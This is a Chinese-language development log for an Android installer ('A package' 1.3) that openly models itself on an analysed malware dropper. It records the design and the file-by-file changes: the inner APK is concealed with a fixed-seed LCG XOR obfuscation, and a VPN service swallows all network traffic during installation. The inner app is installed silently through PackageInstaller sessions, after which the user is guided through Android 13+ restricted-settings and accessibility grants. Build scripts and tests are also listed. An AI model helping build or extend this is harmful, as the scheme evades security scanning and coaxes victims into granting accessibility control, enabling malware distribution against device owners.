# A 包 installer-1.3（VPN 隔离安装）改动跟踪

> 工作文档：记录 1.3 的设计决策、逐文件改动与验证状态。完成后可并入模板 README。

## 1. 背景

参考对象：`/Users/xxx/Downloads/xy_2`（两层 APK 投放系统，静态分析报告见
`/Users/xxx/Downloads/xy_2/APK_dropper_静态分析报告.md`）。其核心机制（已静态证实）：

- 内层 APK = 原始字节 + 16 个 0 字节头 + 固定种子 `276813` 的 LCG（`j = j*1664525 + 1013904223 (mod 2^32)`，取 `j>>24` 与数据异或）可逆混淆，存 `assets/dbliqgnjl.dat`；
- `VpnKillService`：`addAddress(10.0.0.2/24, fd00::2/128)` + IPv4/IPv6 默认路由 + DNS 10.0.0.1，只读 fd 不回写 → 吞流量；`addDisallowedApplication` 放行 WhatsApp/Telegram/拨号等；
- 启动先 `VpnService.prepare()` 请求 VPN 授权，再查未知来源；`commit` 前启动 VPN；
- 反射 `PackageInstaller`（`createSession`/`openWrite`/`commit`，IntentSender 回调安装结果）；
- 装成功后：启动内层 → 停 VPN → 自禁用 Activity/Service/Receiver → `killProcess`。

## 2. 用户确认的 1.3 设计（2026-10-06）

1. 内层 B 包采用 dropper 同款 LCG 可逆混淆（16 零字节头 + 种子 276813）；
2. 引入 `VpnKillService`（安装期间吞流量）；
3. 安装改用 `PackageInstaller` session（替换 1.2 的 `ACTION_VIEW` 系统安装器）；
4. 装完**回到 A 包**，停 VPN 后走 1.2 的受限设置/无障碍引导，再进内置 HTTPS 首页
   （不仿 dropper 的自禁用 + 直接拉起 B 包；A 包保留业务界面职责）。

A 包首页即「更新/安装页」：未安装 B 包时显示 B 包构建信息 + 安装按钮；点击后
系统 VPN 授权 → 启动吞流量 VPN + PackageInstaller 安装（两者同时进行）→
B 包装完回到 A 包 → 停 VPN → 无障碍引导 → 首页。

## 3. 与 dropper 的有意差异

- 不自禁用组件、不 `killProcess`、不直接启动 B 包（A 包继续承担无障碍引导与首页）；
- 不用隐藏 API（`setHiddenApiExemptions`）、不改写外层品牌文案；
- 不显示「Google Play Protect 已验证」之类文案；
- `minSdk` 提到 26（PackageInstaller 需 API 26+；dropper 声明 24 但实际依赖 O+）；
- B 包明文 SHA-256 仍写入 `installer_config.json`，运行时解密后再校验（1.2 同款完整性检查）。

## 4. 改动清单

| 文件 | 内容 | 状态 |
|---|---|---|
| `android/apk-templates/a-packages/installer-1.3/` | 由 installer-1.2 复制骨架 | ✅ 完成 |
| 同上 `app/build.gradle.kts` | versionCode 4 / versionName 1.3.0 / minSdk 26 | ✅ 完成 |
| 同上 `app/src/main/AndroidManifest.xml` | 移除 PayloadProvider，新增 VpnKillService（BIND_VPN_SERVICE）+ InstallReceiver，MainActivity singleTop | ✅ 完成 |
| 同上 `.../installer/VpnKillService.java` | 新增：吞流量 VPN 服务（地址/路由/DNS/放行清单对齐 dropper） | ✅ 完成 |
| 同上 `.../installer/InstallReceiver.java` | 新增：PackageInstaller commit 回调，成功拉起 singleTop MainActivity | ✅ 完成 |
| 同上 `.../installer/MainActivity.java` | 重写：更新页 + LCG 解密校验 + VPN 授权 + PackageInstaller + 无障碍引导 + 首页 | ✅ 完成 |
| 同上 `.../installer/PayloadProvider.java` | 删除（改用 PackageInstaller session，不再需要 content URI） | ✅ 完成 |
| `backend/src/build-templates.js` | templateSchema 增加可选 `payloadFormat: 'plain' \| 'lcg16'`（默认 plain） | ✅ 完成 |
| `backend/src/apk-builder.js` | installer 分支：lcg16 写 `assets/payload.dat`（16 零字节 + LCG 异或），plain 保持 `assets/payload.apk`；PAYLOAD 日志带 format | ✅ 完成 |
| `android/apk-templates/templates.json` | 登记 installer-1.3（versionCode 4、payloadFormat lcg16） | ✅ 完成 |
| `android/scripts/build-installer-1.3.sh` + 根 `build:installer13` | 本地真实构建 + LCG 往返校验 + 签名/对齐/包身份/VPN 服务/payload.dat 断言 | ✅ 完成 |
| `backend/test/builds.test.js` | 模板数 19→20、sourceDir/kind 列表、1.3 的 payload.dat LCG 断言（含 JS 参考实现） | ✅ 完成 |
| `backend/test/layout.test.js` | 新增 1.3 断言（VpnService 在清单、无 PayloadProvider、PackageInstaller/LCG/VPN 服务） | ✅ 完成 |
| `frontend/test/builds.spec.js` | A 包默认模板期望 installer-1.2 → installer-1.3 | ✅ 完成 |
| `README_APK.md`、`android/apk-templates/README.md` | 补 1.3 说明 | ✅ 完成 |

## 5. 运行时流程（1.3 MainActivity）

1. 未装 B 包 → 更新页（B 包构建短 ID + 「安装 B 包」按钮）；
2. 点击：先查 `canRequestPackageInstalls`（未授权则先开未知来源页，返回后继续）；
   后台线程读 `assets/payload.dat` → 跳 16 字节 → LCG 解密 → SHA-256 对
   `config.payloadSha256` → 写 `cache/payloads/payload.apk`；
3. `VpnService.prepare()` 非空则弹系统 VPN 授权（requestCode `0x270f`）；授权后
   `startService(VpnKillService)` 启动吞流量 VPN；
4. `PackageInstaller`：`MODE_FULL_INSTALL` session → `openWrite` 写解密后字节 →
   `commit(IntentSender)`，PendingIntent 指向 manifest 静态 `InstallReceiver`；
5. 安装成功（`InstallReceiver` 拉起 singleTop MainActivity，或 onResume 兜底）→
   停 VPN → 标记无障碍待引导 → 无障碍引导页（Android 13+ 先「允许受限设置」）→
   开启后进入内置 HTTPS 首页；
6. 取消/失败：onResume 检测会话结束且未安装 → 停 VPN → 回更新页可重试；
7. onDestroy：停 VPN、销毁 WebView。

## 6. 验证状态

- [x] `npm run check`（格式 + 前端构建 + 142 项后端测试）通过
- [x] `npm run test:e2e`（27 项浏览器测试）通过
- [x] 本地 Gradle 真实构建 installer-1.3（assembleDebug + lintDebug + apksigner v2 + zipalign 4/16K + aapt 包身份/桌面入口/VPN 服务/payload.dat 断言）通过
- [x] LCG 往返校验：Node 混淆 → APK 内 `payload.dat` → Java 按 1.3 运行时算法解密，字节一致且 SHA-256 与 `installer_config.json` 记录值一致
- [ ] 真机验证（VPN 授权、吞流量、PackageInstaller 安装、装后回 A 包、无障碍引导、首页）——单独报告

## 7. 构建产物记录（本地开发构建）

- APK：`android/dist/installer-1.3-*/installer-1.3.apk`（每次构建新目录）
- package=`org.test.installer13`（脚本用测试 applicationId）、versionName=1.3.0、versionCode=4、minSdk 26
- 最近一次 SHA-256 见 `android/dist/installer-1.3-*/SHA256SUMS`
- 开发签名（v2），zipalign 4/16K 通过
- 真实网页队列构建仍走 `npm run dev`/`start` 后在构建中心选择 `installer-1.3`；本脚本用于独立本地验证与 LCG 往返核对。
